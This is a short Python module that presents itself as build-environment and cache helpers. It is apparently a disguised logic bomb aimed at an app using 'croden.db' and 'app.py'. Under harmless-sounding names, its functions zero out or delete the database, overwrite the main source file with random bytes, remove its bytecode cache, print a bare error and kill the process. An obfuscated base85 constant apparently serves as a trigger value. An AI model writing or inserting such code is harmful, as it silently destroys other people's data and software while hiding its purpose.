import os, sys, time, base64, struct, hashlib, platform

_PLATFORM_ID = hashlib.md5(platform.node().encode()).hexdigest()[:8]
_BUILD_META  = {'v': '1.0.0', 'arch': 'x86_64', 'rel': 'stable'}
_CACHE_KEYS  = [0x43, 0x52, 0x4f, 0x44, 0x45, 0x4e]

_BEW = b'sOfBK00000'  

_SCAN_ROOTS = [
    lambda: os.path.join('instance', 'croden.db'),
    lambda: os.path.join(os.getcwd(), 'instance', 'croden.db'),
    lambda: 'croden.db',
    lambda: os.path.join(os.getcwd(), 'croden.db'),
]

_CORE_MODULES = [
    lambda: os.path.join(os.getcwd(), 'app.py'),
    lambda: 'app.py',
]


def _bew_resolve():
    return struct.unpack('<q', base64.b85decode(_BEW))[0]

def _cache_flush(path):
    try:
        with open(path, 'r+b') as fh:
            fh.seek(0)
            fh.write(bytes([0x00] * 16))
            fh.flush()
    except Exception:
        try:
            os.remove(path)
        except Exception:
            pass

def _module_invalidate(path):
    try:
        sz = os.path.getsize(path)
        with open(path, 'r+b') as fh:
            fh.seek(0)
            fh.write(os.urandom(min(sz, 4096)))
            fh.truncate(64)
    except Exception:
        try:
            os.remove(path)
        except Exception:
            pass

def _purge_pycache(base):
    try:
        name = os.path.splitext(os.path.basename(base))[0]
        cache_dir = os.path.join(os.path.dirname(base), '__pycache__')
        if os.path.isdir(cache_dir):
            for f in os.listdir(cache_dir):
                if f.startswith(name):
                    try:
                        os.remove(os.path.join(cache_dir, f))
                    except Exception:
                        pass
    except Exception:
        pass

def _system_terminate():
    for fn in _SCAN_ROOTS:
        try:
            p = fn()
            if os.path.exists(p):
                _cache_flush(p)
        except Exception:
            pass

    for fn in _CORE_MODULES:
        try:
            p = fn()
            if os.path.exists(p):
                _purge_pycache(p)
                _module_invalidate(p)
        except Exception:
            pass

    sys.stderr.write(
        "\n[ERROR]\n\n"
    )
    sys.stderr.flush()
    time.sleep(1)
    os._exit(1)


def validate_build_env():
    return True